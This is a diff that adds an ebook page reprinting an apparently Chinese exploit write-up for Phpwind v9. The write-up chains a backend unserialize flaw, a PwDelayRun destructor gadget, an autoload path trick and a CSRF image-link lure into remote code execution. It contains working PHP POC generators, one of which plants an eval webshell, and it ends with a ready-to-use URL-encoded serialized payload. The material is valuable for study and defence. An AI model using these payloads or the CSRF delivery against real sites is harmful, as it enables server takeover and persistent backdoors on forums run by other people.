@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Phpwind GET型CSRF任意代码执行</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Phpwind GET型CSRF任意代码执行</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651864858&amp;idx=1&amp;sn=055ecd8c1c3d7e84d7bcd552ca90c467&amp;chksm=8442c7fdb3354eeb1704094b6bcc17552ad0b2e69d3f73aaae4c598039c9a09a3d1925e45634&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651864858&amp;idx=1&amp;sn=055ecd8c1c3d7e84d7bcd552ca90c467&amp;chksm=8442c7fdb3354eeb1704094b6bcc17552ad0b2e69d3f73aaae4c598039c9a09a3d1925e45634&amp;scene=27#wechat_redirect</a></blockquote><p>0x01 后台反序列化位置<br/><br/>首先纵览整个phpwindv9，反序列化的位置很多，但基本都是从数据库里取出的，很难完全控制序列化字符串。最后，找到三处：</p><p><img data-w="" data-ratio="0.0683453237410072" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsdic6tsb6iayoRg4MWfYH4iats7hicGmuBvItFu53jXMibTV32bw000IFmQA/0?wx_fmt=jpeg" src="../Images/efb669060a37bdce93b2c059514c637d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsdic6tsb6iayoRg4MWfYH4iats7hicGmuBvItFu53jXMibTV32bw000IFmQA/0?wx_fmt=jpeg"/><br/>可恶的是，三处都在后台的Task模块下。Task模块是『任务中心』功能，只有能进入后台的用户才可以访问：</p><p><img data-w="" data-ratio="0.6241007194244604" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsRPqWf5rxsTPUetYx0O1ugW9DUS3Kx9Oib77yol10fGjTiaSw9Fxl7SMQ/0?wx_fmt=jpeg" src="../Images/7a3fe80581dc63509f4e78380b1ce937.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsRPqWf5rxsTPUetYx0O1ugW9DUS3Kx9Oib77yol10fGjTiaSw9Fxl7SMQ/0?wx_fmt=jpeg"/><br/>随便打开一个， src/applications/task/admin/TaskConditionMemberController.php<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>class TaskConditionMemberController extends AdminBaseController{<br/>
+    /* (non-PHPdoc)<br/>
+     * @see AdminBaseController::beforeAction()<br/>
+     */<br/>
+    public function beforeAction($handlerAdapter) {<br/>
+        parent::beforeAction($handlerAdapter);<br/>
+        $var = unserialize($this-&gt;getInput('var'));<br/>
+        if (is_array($var)) {<br/>
+            $this-&gt;setOutput($var, 'condition');<br/>
+        }<br/>
+    }</code></pre></fieldset><p class="detail"><br/><br/>beforeAction将会在实际执行Action之前执行。这里$var = unserialize($this-&gt;getInput('var'));，从Input中获取var参数的值，进行反序列化。这个Input可以来自get/post/cookie。我们只要在phpwind里找到反序列化可以利用的点，就能在这里触发反序列化漏洞。<br/><br/><br/><br/>0x02 PwDelayRun类__destruct方法<br/><br/>全局搜一下关键词__destruct，很快找到了PwDelayRun类：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>class PwDelayRun {<br/>
+    <br/>
+    private static $instance = null;<br/>
+    private $_callback = array();<br/>
+    private $_args = array();<br/><br/>
+    private function __construct() {<br/><br/>
+    }<br/><br/>
+    public function __destruct() {<br/>
+        foreach ($this-&gt;_callback as $key =&gt; $value) {<br/>
+            call_user_func_array($value, $this-&gt;_args[$key]);<br/>
+        }<br/>
+    }<br/><br/>
+    ...<br/>}</code></pre></fieldset><p class="detail"><br/><br/>可见__destruct方法，其中遍历了_callback数组，用call_user_func_array执行任意函数。这里如果_callback可控，那么就可以直接执行assert+任意代码了。原本是一个十分简单的漏洞，但我们在TaskConditionMemberController::beforeAction::unserialize里下断点，执行var_dump(get_declared_classes());exit;，查看当前已经定义的类：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>Array<br/>(<br/>
+    [0] =&gt; stdClass<br/>
+    [1] =&gt; Exception<br/>
+    ...<br/>
+    [330] =&gt; WindMysqlPdoAdapter<br/>
+    [331] =&gt; WindResultSet<br/>
+    [332] =&gt; AdminUserBo<br/>
+    [333] =&gt; AdminLogService<br/>
+    [334] =&gt; WindFile<br/>)</code></pre></fieldset><p><br/><br/>其中并没有PwDelayRun类。看来在反序列化的时候，并没有加载这个类，所以我即使构造了利用方法，也『造』不出PwDelayRun对象。那怎么办？<br/><br/><br/><br/>0x03 利用spl_autoload包含任意php文件<br/><br/>在Joomla那个反序列化漏洞（ https://**.**.**.**/PENETRATION/joomla-unserialize-code-execute-vulnerability.html ）里，提到了一个方法。因为Joomla内的spl_autoload会根据类名自动加载文件，所以当时构造了一个JSimplepieFactory类对象，而factory.php中包含了import目标类的方法：</p><p><img data-w="" data-ratio="0.6834532374100719" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsnFUmYUeSG9lMEciacAXZ4WjGIJnV89mLukB43xISiakVv7NkNmb67pIQ/0?wx_fmt=jpeg" src="../Images/c3b8323c3497b44d704e58aa570664e3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsnFUmYUeSG9lMEciacAXZ4WjGIJnV89mLukB43xISiakVv7NkNmb67pIQ/0?wx_fmt=jpeg"/><br/>所以成功反序列化了simplepie类。回到Phpwind。同道理，我们在Phpwind中看看哪些文件包含了PwDelayRun：</p><p><img data-w="" data-ratio="0.21402877697841727" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs1NCAnPVD92dTIdU1kksbDzMWNTynQ3HeLkpaoVicgCGGd0ttj7KBbOA/0?wx_fmt=jpeg" src="../Images/01c0ae2e349cc7c20ad2397d2c882d61.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs1NCAnPVD92dTIdU1kksbDzMWNTynQ3HeLkpaoVicgCGGd0ttj7KBbOA/0?wx_fmt=jpeg"/><br/>静态包含PwDelayRun的就只有PwConfigService类。我在刚才获得的类里看看，不幸的是，PwConfigService也没有加载。继续查找PwConfigService，并没有静态加载这个类的方法：<br/><img data-w="" data-ratio="0.21402877697841727" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAscMEibPQxHwUBqGj1vsFDuMn3xj0GbQCCXDaqofyxcxXs6ptzAmmPlCg/0?wx_fmt=jpeg" src="../Images/5c71de8aa46af8fbbcb07bfcd49451b4.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAscMEibPQxHwUBqGj1vsFDuMn3xj0GbQCCXDaqofyxcxXs6ptzAmmPlCg/0?wx_fmt=jpeg"/><br/>所以我们这个链就断了。但利用spl_autoload这个思路不能断，我们思考一下，现代php框架中必然存在
+autoload，在反序列化的过程中发现了不存在的类『PwDelayRun』，就会直接传入注册好的spl_autoload函数中。我在 
+/wind/Wind.php 中，可以找到spl_autoload_register函数的调用：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>public static function init() {<br/>
+    self::$isDebug = WIND_DEBUG;<br/>
+    function_exists('date_default_timezone_set') &amp;&amp; date_default_timezone_set('Etc/GMT+0');<br/>
+    self::register(WIND_PATH, 'WIND', true);<br/>
+    if (!self::$_isAutoLoad) return;<br/>
+    if (function_exists('spl_autoload_register'))<br/>
+        spl_autoload_register('Wind::autoLoad');<br/>
+    else<br/>
+        self::$_isAutoLoad = false;<br/>
+    self::_loadBaseLib();<br/>}</code></pre></fieldset><p class="detail"><br/><br/>将Wind::autoload注册为自动加载函数。跟进Wind::autoLoad<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>public static function autoLoad($className, $path = '') {<br/>
+    if ($path)<br/>
+        include $path . '.' . self::$_extensions;<br/>
+    elseif (isset(self::$_classes[$className])) {<br/>
+        include self::$_classes[$className] . '.' . self::$_extensions;<br/>
+    } else<br/>
+        include $className . '.' . self::$_extensions;<br/>}</code></pre></fieldset><p><br/><br/>autoLoad第二个参数是没有值的，所以这里，最后会走到这一步：include $className . '.' . self::$_extensions;。看到include我就有点激动，但静下心想一下发现还是有问题的。因为这里的className是没有路径的，而PwDelayRun类在src/library/utility/PwDelayRun.php文件中，我需要传入路径才可以包含到这个类。虽然类名不能包含特殊字符，但其实类名中是可以包含\的：</p><p><img data-w="" data-ratio="0.21762589928057555" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsYN3f1KKicvicugELo9ib9k298CDAW3FZ2PwQw0b9fD3dJ1GrHEU6micTXA/0?wx_fmt=jpeg" src="../Images/53b5a0bc0eb7090097ff13016a34e225.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsYN3f1KKicvicugELo9ib9k298CDAW3FZ2PwQw0b9fD3dJ1GrHEU6micTXA/0?wx_fmt=jpeg"/><br/>这涉及到php中的命名空间的知识。学过新型框架的同学肯定对命名空间十分熟悉，所以我没必要多介绍。命名空间中可
+以包含\，而在windows下，\也可以作为路径的分隔符。（由此可见，这个漏洞仅限于Windows服务器）所以这里，我可以将类名设置为src
+\library\utility\PwDelayRun（其实就是src\library\utility命名空间下的PwDelayRun类），最后
+在Wind::autoload里进行包含 include src\library\utility\PwDelayRun.php<br/><br/><br/><br/>0x04 利用数组+命名空间加载相同名字的类<br/><br/>还有一个问题，我们这里将类名设置为src\library\utility\PwDelayRun，而：整个phpwind全局是没有使用命名空间的，
+也就是默认命名空间为\，但现在的PwDelayRun类所在的命名空间为src\library\utility。这样，即使我包含了src
+\library\utility\PwDelayRun.php文件，反序列化的时候是实例化的src\library\utility
+\PwDelayRun类。但phpwind的命名空间是\，上下文存在的类是\PwDelayRun类，还是无法正常进行（因为找不到src
+\library\utility\PwDelayRun类）。我想了一下，其实也好办，只要变通一下。我们只要生成src\library
+\utility\PwDelayRun类和\PwDelayRun类两个对象，放在一个数组中，在反序列化前者的过程中include目标文件，在反序
+列化后者的过程中拿到PwDelayRun对象。我构造了一个POC：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>// test1.php<br/>header("Content-Type: text/plain");<br/>require_once "test2.php";<br/><br/>class PwDelayRun{<br/>
+    private $_callback;<br/>
+    private $_args;<br/><br/>
+    function __construct()<br/>
+    {<br/>
+        $this-&gt;_callback = [<br/>
+            'assert'<br/>
+        ];<br/>
+        $this-&gt;_args = [<br/>
+            ["phpinfo();exit;"]<br/>
+        ];<br/>
+    }<br/>}<br/>$obj = [<br/>
+    new src\library\utility\PwDelayRun(),<br/>
+    new PwDelayRun()<br/>];<br/>echo urlencode(serialize($obj));<br/><br/><br/>//test2.php<br/>namespace src\library\utility;<br/>class PwDelayRun{<br/>}</code></pre></fieldset><p><br/><br/>执行test1.php即可拿到POC对象。</p><p><img data-w="" data-ratio="0.13129496402877697" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs7PQsdMLWgG0ohDhoxukckb5Kj83Yek6eBCZTM4us1sCR8ogUMUgsNw/0?wx_fmt=jpeg" src="../Images/656ffd127726df53d18aa2ba986d04b5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs7PQsdMLWgG0ohDhoxukckb5Kj83Yek6eBCZTM4us1sCR8ogUMUgsNw/0?wx_fmt=jpeg"/><br/>将这个字符串传入var参数，结果……</p><p><img data-w="" data-ratio="0.20503597122302158" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsVicC4hWquK75LP9zy7pvxFXy4JtUz69UZpvBb2fIM6bAiaAo38FnZlFA/0?wx_fmt=jpeg" src="../Images/ddd167d3136905b8cd51c7ed5009b9f7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsVicC4hWquK75LP9zy7pvxFXy4JtUz69UZpvBb2fIM6bAiaAo38FnZlFA/0?wx_fmt=jpeg"/><br/>啥事也没发生……这是什么情况？<br/><br/><br/><br/>0x05 利用stdClass代替数组绕过限制<br/><br/>我们回看TaskConditionMember类，看看反序列化的那个beforeAction函数：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>public function beforeAction($handlerAdapter) {<br/>
+    parent::beforeAction($handlerAdapter);<br/>
+    $var = unserialize($this-&gt;getInput('var'));<br/>
+    if (is_array($var)) {<br/>
+        $this-&gt;setOutput($var, 'condition');<br/>
+    }<br/>}</code></pre></fieldset><p class="detail"><br/><br/>后面有个判断is_array，是它在捣鬼。如果var是数组的话，就设置到output里。所以，最后该对象并没有销毁，没有销毁那么实际上就没有调用__destruct函数，所以也无法执行任意代码了。要让is_array返回false，只需序列化一个非数组对象即可。其实在php源码层，对象是用数组来模拟的，我们只需要用一个对象代替数组即可。php最简单的对象就是stdClass，我将POC改为如下即可：<br/><br/></p><fieldset class="fieldset fieldset-code"><legend>code 区域</legend><pre><code>// test.php<br/>header("Content-Type: text/plain");<br/>require_once "test2.php";<br/><br/>class PwDelayRun{<br/>
+    private $_callback;<br/>
+    private $_args;<br/><br/>
+    function __construct()<br/>
+    {<br/>
+        $this-&gt;_callback = [<br/>
+            'assert'<br/>
+        ];<br/>
+        $this-&gt;_args = [<br/>
+            ["phpinfo();file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;');exit;"]<br/>
+        ];<br/>
+    }<br/>}<br/>$obj = new stdClass();<br/>$obj-&gt;a = new src\library\utility\PwDelayRun();<br/>$obj-&gt;b = new PwDelayRun();<br/>echo urlencode(serialize($obj));</code></pre></fieldset><p><br/><br/>生成序列化字符串：</p><p><img data-w="" data-ratio="0.14928057553956833" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAseenB7cY2H8NXAJYT728KyBMeXWo5YMzfnw7Eg5Es8GiamhU2ytibticVQ/0?wx_fmt=jpeg" src="../Images/9531a16f9fc1449b70321297c07da8e1.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAseenB7cY2H8NXAJYT728KyBMeXWo5YMzfnw7Eg5Es8GiamhU2ytibticVQ/0?wx_fmt=jpeg"/><br/>传入var参数：</p><p><img data-w="" data-ratio="0.40467625899280574" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsg8WbSGn9T31B4f3ZAgiaORw7UJTsyqzeCxBjK1f3gCaBvus3hUqyVcA/0?wx_fmt=jpeg" src="../Images/ff2d71675aa3d0fe33e5573ac828ccab.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsg8WbSGn9T31B4f3ZAgiaORw7UJTsyqzeCxBjK1f3gCaBvus3hUqyVcA/0?wx_fmt=jpeg"/><br/>万事大吉，成功！管理员只需拥有后台『论坛任务』功能，即可直接执行任意代码。<br/><br/><br/><br/>0x06 前台利用CSRF起飞<br/><br/>这个漏洞本是一个利用技巧很妙的漏洞，但最关键的问题是其出现在后台，利用门槛太高。但这个漏洞又有一个特点，那就是其为GET方法，只需要一个URL
+即可触发。所以，我们可以用类似Discuz这个漏洞的方法： http://**.**.**.**/bugs/wooyun-2014-064886
+ ，将URL插入前台帖子的图片中：<img data-w="" data-ratio="0.5089928057553957" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs0gicKCp3263NyOMDerOYaZxQ82lrYlxgz1xyza1hr4RPLaiaewbdvicHw/0?wx_fmt=jpeg" src="../Images/7f56ec73187a003252b69037cf9de1c1.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAs0gicKCp3263NyOMDerOYaZxQ82lrYlxgz1xyza1hr4RPLaiaewbdvicHw/0?wx_fmt=jpeg"/><br/>结果……phpwind给我把&amp;都转义了，无法正常执行。不过没关系，只要我写一个302跳转，跳转到目标URL即可：</p><p><img data-w="" data-ratio="0.24820143884892087" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAspRRrqJXeYRewxuuelF4HbH1RMhk6Gs8Orf3WNpkBCiaUmuf3RbW5Rxw/0?wx_fmt=jpeg" src="../Images/2e9f200961c1c101c1a3ef678f17fe30.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAspRRrqJXeYRewxuuelF4HbH1RMhk6Gs8Orf3WNpkBCiaUmuf3RbW5Rxw/0?wx_fmt=jpeg"/><br/>将这个php作为图片地址写入帖子：</p><p><img data-w="" data-ratio="0.4910071942446043" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAspicicJtdm6ADL4ibwNpLSxqVJhOOhjzuOWYicGoPDjGGFW8vneH8DlSsmg/0?wx_fmt=jpeg" src="../Images/189ad0217c9d48483039591bcc2e158c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAspicicJtdm6ADL4ibwNpLSxqVJhOOhjzuOWYicGoPDjGGFW8vneH8DlSsmg/0?wx_fmt=jpeg"/><br/>管理员浏览</p><p><img data-w="" data-ratio="0.7356115107913669" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsDbsXiciaVnfL2dVfn1I68OT1TBbndf2kUES2zBSkryz9w8icB0qKpfN9g/0?wx_fmt=jpeg" src="../Images/5cb3a347837741a145ad5e838b8ebe93.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsDbsXiciaVnfL2dVfn1I68OT1TBbndf2kUES2zBSkryz9w8icB0qKpfN9g/0?wx_fmt=jpeg"/><br/>获得webshell：</p><p><img data-w="" data-ratio="0.5611510791366906" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsZH47NQ7kPBEPjpIjOxgoyal3CEQ9Aib4QVr7AjdF666dQT8FqtjvictA/0?wx_fmt=jpeg" src="../Images/a184223d237fa504849eb938c2311101.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IG4bPQgvrPmyWHRmaoqOzAsZH47NQ7kPBEPjpIjOxgoyal3CEQ9Aib4QVr7AjdF666dQT8FqtjvictA/0?wx_fmt=jpeg"/><br/></p><pre><code>**.**.**.**/phpwind/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A30%3A%22src%5Clibrary%5Cutility%5CPwDelayRun%22%3A0%3A%7B%7Ds%3A1%3A%22b%22%3BO%3A10%3A%22PwDelayRun%22%3A2%3A%7Bs%3A21%3A%22%00PwDelayRun%00_callback%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7Ds%3A17%3A%22%00PwDelayRun%00_args%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A15%3A%22phpinfo%28%29%3Bexit%3B%22%3B%7D%7D%7D%7D</code></pre><p><br/></p>
+        
+</body>
+</html>
